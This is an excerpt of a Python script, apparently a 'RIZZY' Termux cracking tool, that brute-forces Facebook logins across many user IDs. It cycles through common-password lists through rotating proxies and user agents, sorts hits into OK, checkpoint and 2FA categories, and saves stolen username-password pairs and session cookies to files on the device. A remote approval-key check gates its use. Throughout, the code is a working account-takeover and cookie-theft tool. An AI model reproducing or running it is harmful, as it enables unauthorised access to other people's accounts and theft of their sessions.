...
try:
    prox = requests.get('https://raw.githubusercontent.com/RIZZY-404/Live-Proxy/main/prox.txt').text
...
d8888b. d888888b d88888D d88888D db    db 
88  `8D   `88'   YP  d8' YP  d8' `8b  d8' 
88oobY'    88       d8'     d8'   `8bd8'  
88`8b      88      d8'     d8'      88    
88 `88.   .88.    d8' db  d8' db    88    
88   YD Y888888P d88888P d88888P    YP    
                                    
\033[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[1;92m═══════════════════════════════════════════════════
\033[1;32m • DEVLOPER RIZZY (🎉)
...
def menu():
    ...
    jalan('  \033[1;93m═══════════════════════════════════════════════════')
    RIZZY = input('\033[1;31m[\033[1;37m?\033[1;31m] \033[1;32mCHOOSE\033[1;37m :\033[0;95m ')
    os.system('clear')
    print(logo)
    if RIZZY in ['1','01']:
        crack_file()
...
def login(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mRIZZY\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        ...
        for pw in ["123456","1234567","12345678","123456789","87654321","987654321","654321","123123","asdfgh","asdf1234","Asdf1234","qwerty","Qwerty","qwerty1234","Asdf123", "112233", "1234567890", "987654321", "0987654321"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/RIZZY-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r {RED}[CP-ID] {uid} • {pw}")
                open("/sdcard/RIZZY-OLD-CP.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r {pink}[VERIFICATION-NEED] {uid} • {pw}")
                open("/sdcard/RIZZY-OLD-2F.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
...
def crack(idf, pwv):
    ...
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mRIZZY•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in q:
                print(f'\r\x1b[1;96m[RIZZY-CP] \x1b[38;5;205m {idf} | {pw}')
                with open('/sdcard/RIZZY-FILE-CP.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n')
                cps.append(idf)
                cp += 1
                break
                ...
                print(f'\r\x1b[1;96m[RIZZY-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{cookie_string} ')
                with open('/sdcard/RIZZY-FILE-M1-OK.txt', 'a') as file:
...
def crackfree(idf, pwv):
    global loop, ok, cp, cps, oks
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mRIZZY•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua = random.choice(ugen2)
    ua = random.choice(uadef)
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in q:
                ...
                with open('/sdcard/RIZZY-FILE-M2-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                oks.append(idf)
                break
            else:
...
def cracktouch(idf, pwv):
    global cp, ok, loop
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mRIZZY•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua = random.choice(ugen2)
    ua = random.choice(uadef)
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[1;96m[RIZZY-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
                with open('/sdcard/RIZZY-FILE-M3-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                ok.append(idf)
                break
        except requests.exceptions.ConnectionError:
...
def crackhost(idf, pwv):
    global cp, ok, loop
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mRIZZY•M4\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[1;96m[RIZZY-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
                linex()
                with open('/sdcard/RIZZY-FILE-M4-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                cek_apk(kuki)
                ok.append(idf)
                break
...
def rndm2(uid, passlist):
    ...
    global proxy
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f'\r\r{B}[{G}RIZZY-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'session_key' in po:
                ...
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[RIZZY-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                    with open('/sdcard/RIZZY-RNDM-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;31;40m|RIZZY-S2-LOCK| {uid} | {pas}')
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                print(f'\r\r{B}[{Y}RIZZY-CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                with open('/sdcard/RIZZY-S2-CP.txt', 'a') as f:
                    f.write(f'{uid} | {pas}\n')
                cps.append(uid)
                break
            else:
...
def rndm3(uid, passlist):
    ...
    for pas in passlist:
        try:
            ...
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}RIZZY-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            fb = "m"
            ...
            if 'c_user' in log_cookies:
                ...
                if res == 'LIVE':
                    ...
                    with open('/sdcard/RIZZY--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|RIZZY-S4-LOCK| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[RIZZY--𝟸𝙵] {uid} [💙] {pas} ')
                    with open('/sdcard/RIZZY--𝟸𝙵💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                    print(f'\r\033[1;30m[RIZZY--CP] {uid} [💔] {pas} ')
                    with open('/sdcard/RIZZY--𝙲𝙿🥺💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
...
"""def rndm3(uid, passlist):
    ...
    try:
        for pas in passlist:
            ...
            RIZZYn = session.cookies.get_dict().keys()
            if 'c_user' in RIZZYn:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                sort = coki.split("sb=")[1]
                coki1 = coki.split("1000")[1]
...
def rndm4(uid, passlist):
    ...
    for pas in passlist:
        try:
            ...
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}RIZZY-M4{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
...
def rndm5(uid, passlist):
    ...
    for pas in passlist:
        try:
            ...
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}RIZZY-M5{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if res == 'LIVE':
                    ...
                    print(f'\r\x1b[1;35;40m|RIZZY-S5-LOCK| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    ...
                    print(f'\r\033[1;30m[RIZZY--CP] {uid} [💔] {pas} ')
                    with open('/sdcard/Rizzy-cp🥺💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
...
def approval():
    ...
    y = ":".join(b + a)
    key = f"ROHEET{y}"
    row = httpx.get("https://github.com/ROHEETxSARU/RSv1/blob/main/Approval.txt").text
    if key in row:
        #loading()
        os.system("clear")
        print(logo)
